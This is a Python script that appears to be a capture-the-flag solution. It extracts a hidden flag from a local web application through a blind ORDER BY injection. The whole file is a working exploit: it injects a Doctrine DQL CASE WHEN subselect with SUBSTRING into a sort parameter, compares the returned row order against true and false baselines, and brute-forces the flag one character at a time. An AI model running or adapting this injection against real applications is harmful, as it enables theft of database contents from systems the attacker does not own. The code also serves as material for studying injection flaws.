#!/usr/bin/env python3
"""
solve.py — extract flag via ORDER BY injection using DQL subselect that returns SUBSTRING.

Injection used (DQL-friendly):
 CASE WHEN (SELECT SUBSTRING(f2.flag, {pos}, 1) FROM App\\Entity\\Flag f2 WHERE f2.id = 1) = '<char>'
      THEN e.cweId ELSE e.name END

Notes:
 - Ensure your Flag entity exists and the flag row has id = 1 (or change the WHERE clause).
 - Adjust BASE_URL / ALPHABET / MAX_LEN for your environment.
"""

import requests
from bs4 import BeautifulSoup
import time
import sys

# Config
BASE_URL = "http://127.0.0.1:8080/"
TIMEOUT = 8.0
SLEEP = 0.02
MAX_LEN = 200

# Narrow alphabet for speed if you know flag format
ALPHABET = "CTF{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"

def fetch_first_cell(column_expr: str, direction: str = "DESC") -> str:
    params = {"column": column_expr, "direction": direction}
    r = requests.get(BASE_URL, params=params, timeout=TIMEOUT)
    r.raise_for_status()
    soup = BeautifulSoup(r.text, "html.parser")
    tbody = soup.find("tbody")
    rows = tbody.find_all("tr") if tbody else soup.find_all("tr")
    if not rows:
        return ""
    first = rows[0] if tbody else (rows[1] if len(rows) > 1 else rows[0])
    cols = first.find_all(["td", "th"])
    if not cols:
        return ""
    return cols[0].get_text(strip=True)

def make_case_expr(condition: str) -> str:
    return f"CASE WHEN {condition} THEN e.cweId ELSE e.name END"

# DQL: we'll build a subselect that returns SUBSTRING(...) from the Flag entity row (id=1)
# We must escape backslashes so final URL contains App\Entity\Flag
DQL_FLAG_ENTITY = "App\\Entity\\Flag"

def test_char_at_pos(pos: int, ch: str, baseline_true: str, baseline_false: str) -> bool:
    """
    Test whether the character at `pos` equals `ch` by using:
    (SELECT SUBSTRING(f2.flag, pos, 1) FROM App\Entity\Flag f2 WHERE f2.id = 1) = 'ch'
    """
    safe_ch = ch.replace("'", "''")
    # build the subselect that returns substring at pos
    # note: use f2 alias inside subselect to avoid confusion
    subselect = f"(SELECT SUBSTRING(f2.flag, {pos}, 1) FROM {DQL_FLAG_ENTITY} f2 WHERE f2.id = 1)"
    condition = f"{subselect} = '{safe_ch}'"
    expr = make_case_expr(condition)
    val = fetch_first_cell(expr)
    if val == baseline_true:
        return True
    if val == baseline_false:
        return False
    # ambiguous — raise so caller knows
    raise RuntimeError(f"Ambiguous oracle response for pos={pos}, ch={ch!r}: got {val!r}")

def recover_flag():
    print("[*] fetching baselines")
    true_expr = make_case_expr("1=1")
    false_expr = make_case_expr("1=2")
    baseline_true = fetch_first_cell(true_expr)
    baseline_false = fetch_first_cell(false_expr)
    print(f"[+] baseline true  => {baseline_true!r}")
    print(f"[+] baseline false => {baseline_false!r}")

    if baseline_true == baseline_false:
        print("[-] Warning: baselines identical; oracle unreliable.")

    flag = ""
    for pos in range(1, MAX_LEN + 1):
        found = False
        for ch in ALPHABET:
            try:
                ok = test_char_at_pos(pos, ch, baseline_true, baseline_false)
            except RuntimeError as e:
                print(f"[!] Oracle error at pos {pos} for char {ch!r}: {e}")
                sys.exit(1)
            time.sleep(SLEEP)
            if ok:
                flag += ch
                found = True
                print(f"[+] pos {pos}: found '{ch}' -> flag so far: {flag!r}")
                break
        if not found:
            print(f"[*] no matching character at position {pos} -> assuming end of flag")
            break
    return flag

def main():
    print("[*] starting extraction (SUBSTRING-via-subselect method)")
    try:
        flag = recover_flag()
    except requests.RequestException as e:
        print(f"[!] HTTP error: {e}")
        sys.exit(2)
    if flag:
        print(f"[+] recovered flag: {flag}")
    else:
        print("[-] no flag recovered")

if __name__ == "__main__":
    main()
